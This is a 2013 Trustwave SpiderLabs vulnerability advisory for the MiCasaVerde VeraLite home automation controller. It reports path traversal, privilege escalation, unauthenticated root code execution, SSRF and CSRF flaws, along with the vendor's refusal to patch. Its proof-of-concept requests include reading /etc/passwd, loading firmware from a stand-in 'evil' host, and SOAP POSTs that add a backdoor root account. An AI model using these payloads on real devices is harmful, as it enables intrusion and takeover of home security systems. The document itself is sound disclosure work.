@@ -1,0 +1,212 @@
+Trustwave SpiderLabs Security Advisory TWSL2013-019:
+Multiple Vulnerabilities in MiCasaVerde VeraLite
+
+Published: 08/01/13
+Version: 1.0
+
+Vendor: MiCasaVerde (http://www.micasaverde.com/)
+Product: VeraLite
+Version affected:  1.5.408
+
+Product description:
+The MiCasaVerde VeraLite is the budget model from MiCasaVerde, a product
+which centralizes control over home automation devices such as door locks,
+window blinds, security cameras, smoke detectors, HVAC systems, lights,
+etc.
+
+Finding 1: Path Traversal
+*****Credit: Daniel Crowley of Trustwave SpiderLabs
+CVE: CVE-2013-4861
+CWE: CWE-23
+
+The VeraLite has a path traversal vulnerability allowing for disclosure of
+arbitrary files. This allows an attacker to retrieve the contents of any
+file on the system such as the /etc/passwd file which contains the hashed
+root password as well as the tech support remote access password if remote
+access has been configured.
+
+A proof of concept can be run against a VeraLite by using the following URL:
+GET http://A.B.C.D/cgi-bin/cmh/get_file.sh?filename=../../../../../etc/passwd
+
+On a newly unboxed VeraLite, this shouldn't work as the first part of the
+path used by the script doesn't exist, but the directory which must exist
+for exploitation to work correctly can be created by using the
+store_file.sh script, like so:
+
+GET http://A.B.C.D/cgi-bin/cmh/store_file.sh?store_file=test
+
+This attack can also be launched through the Internet-based control panel
+at cp.mios.com when logged in as either an admin or guest level account.
+
+Finding 2: Insufficient Authorization Checks
+*****Credit: Daniel Crowley of Trustwave SpiderLabs
+CVE: CVE-2013-4862
+CWE: CWE-285
+
+The VeraLite makes a distinction between Administrator and Guest users such
+that Guest users should not be able to make changes to the configuration of
+the system. There are several functionalities included in the VeraLite
+console available to Guest level users which can be used to escalate
+privileges.
+
+A) Firmware update - This allows a guest to push custom firmware to the
+unit and can allow for full compromise of the device.
+
+A proof of concept can be seen using the following URL:
+GET http://A.B.C.D/upgrade_step2.sh?squashfs=http://example.com/evil_vera_firmware.squashfs
+
+B) Settings backup - This allows a guest to obtain copies of various
+sensitive files, including the lighttpd.users file which contains hashed
+cp.mios.com passwords, and the passwd file which contains the hashed root
+password.
+
+GET http://A.B.C.D/cgi-bin/cmh/backup.sh?external=1
+
+C) Test Luup code (Lua) - This allows a guest to run Lua code on the
+VeraLite as root. A backdoor account can be added with the following POST
+request:
+
+POST /port_49451/upnp/control/hag HTTP/1.1
+Host: A.B.C.D
+Accept: text/javascript, text/html, application/xml, text/xml, */*
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+X-Prototype-Version: 1.7
+Content-Type: text/xml;charset=UTF-8
+MIME-Version: 1.0
+SOAPACTION: "urn:schemas-micasaverde-org:service:HomeAutomationGateway:1#RunLua"
+Content-Length: 311
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+<s:Envelope s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body>    <u:RunLua xmlns:u="urn:schemas-micasaverde-org:service:HomeAutomationGateway:1">        <DeviceNum></DeviceNum> <Code>os.execute("echo 'backdoor%3a%3a0%3a0%3aBackdoor Root Account%3a/tmp%3a/bin/ash' %3e%3e /etc/passwd")</Code>    </u:RunLua></s:Body></s:Envelope>
+
+
+Finding 3: Insufficient Authentication Checks
+*****Credit: Daniel Crowley of Trustwave SpiderLabs
+CVE: CVE-2013-4863
+CWE: CWE-287
+
+The VeraLite exposes UPnP functionality which allows for Lua code to be run
+as root from the LAN without authentication using the RunLua action in the
+HomeAutomationGateway service of the HomeAutomationGateway device. A
+backdoor account can be added with the following POST request to port
+49451:
+
+POST /upnp/control/hag HTTP/1.1
+Host: A.B.C.D:49451
+Accept: text/javascript, text/html, application/xml, text/xml, */*
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+X-Prototype-Version: 1.7
+Content-Type: text/xml;charset=UTF-8
+MIME-Version: 1.0
+SOAPACTION: "urn:schemas-micasaverde-org:service:HomeAutomationGateway:1#RunLua"
+Content-Length: 311
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+<s:Envelope s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body>    <u:RunLua xmlns:u="urn:schemas-micasaverde-org:service:HomeAutomationGateway:1">        <DeviceNum></DeviceNum> <Code>os.execute("echo 'backdoor%3a%3a0%3a0%3aBackdoor Root Account%3a/tmp%3a/bin/ash' %3e%3e /etc/passwd")</Code>    </u:RunLua></s:Body></s:Envelope>
+
+Finding 4: Server-Side Request Forgery
+*****Credit: Daniel Crowley of Trustwave SpiderLabs
+CVE: CVE-2013-4864
+CWE: CWE-918
+
+The VeraLite will make HTTP requests on behalf of a user using the
+/cgi-bin/cmh/proxy.sh script. A proof of concept to pull the homepage of
+trustwave.com is as follows:
+
+GET http://A.B.C.D/cgi-bin/cmh/proxy.sh?url=https://www.trustwave.com
+
+This allows an attacker to bypass firewall controls, use the VeraLite as a proxy
+
+
+Finding 5: Cross-Site Request Forgery
+*****Credit: Daniel Crowley of Trustwave SpiderLabs
+CVE: CVE-2013-4865
+CWE: CWE-352
+
+The VeraLite does not implement any defense against cross-site request
+forgery. A proof of concept as seen below can cause a Vera user to update
+their firmware using a custom firmware URL:
+
+<html>
+<body>
+<iframe src="http://A.B.C.D/upgrade_step2.sh?squashfs=http://example.com/evil_vera_firmware.squashfs" width="1" height="1">
+</iframe>
+</body>
+</html>
+
+If this PoC was embedded in any web page a targeted user visited, an
+attacker would be able to make arbitrary changes to the firmware on the
+device, allowing the potential for remote root access.
+
+Vendor Response:
+"...the "vulnerabilities" you referred to were deliberate design decisions
+because that's what the customers in this particular channel (ie Vera
+retail) want.  As you can see we have an open forum to discuss this, and
+very people object to leaving Vera open.  So we are not able to lock down
+the gateway, and effectively break the systems of many customers who rely
+on the open system to run their own scripts and plugins."
+
+Remediation Steps:
+No official patch is available.  To limit exposure,
+network access to these devices should be limited to authorized
+personnel through the use of access control lists and proper
+network segmentation.
+
+Revision History:
+04/23/13 - Vulnerability disclosed to vendor
+06/04/13 - Vendor confirms they will not fix
+08/01/13 - Advisory published
+
+
+References
+1. http://www.micasaverde.com/
+
+
+About Trustwave:
+Trustwave is the leading provider of on-demand and subscription-based
+information security and payment card industry compliance management
+solutions to businesses and government entities throughout the world. For
+organizations faced with today's challenging data security and compliance
+environment, Trustwave provides a unique approach with comprehensive
+solutions that include its flagship TrustKeeper compliance management
+software and other proprietary security solutions. Trustwave has helped
+thousands of organizations--ranging from Fortune 500 businesses and large
+financial institutions to small and medium-sized retailers--manage
+compliance and secure their network infrastructure, data communications and
+critical information assets. Trustwave is headquartered in Chicago with
+offices throughout North America, South America, Europe, Africa, China and
+Australia. For more information, visit https://www.trustwave.com
+
+About Trustwave SpiderLabs:
+SpiderLabs(R) is the advanced security team at Trustwave focused on
+application security, incident response, penetration testing, physical
+security and security research. The team has performed over a thousand
+incident investigations, thousands of penetration tests and hundreds of
+application security tests globally. In addition, the SpiderLabs Research
+team provides intelligence through bleeding-edge research and proof of
+concept tool development to enhance Trustwave's products and services.
+https://www.trustwave.com/spiderlabs
+
+Disclaimer:
+The information provided in this advisory is provided "as is" without
+warranty of any kind. Trustwave disclaims all warranties, either express or
+implied, including the warranties of merchantability and fitness for a
+particular purpose. In no event shall Trustwave or its suppliers be liable
+for any damages whatsoever including direct, indirect, incidental,
+consequential, loss of business profits or special damages, even if
+Trustwave or its suppliers have been advised of the possibility of such
+damages. Some states do not allow the exclusion or limitation of liability
+for consequential or incidental damages so the foregoing limitation may not
+apply.
+
+________________________________
+
+This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is STRICTLY PROHIBITED. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
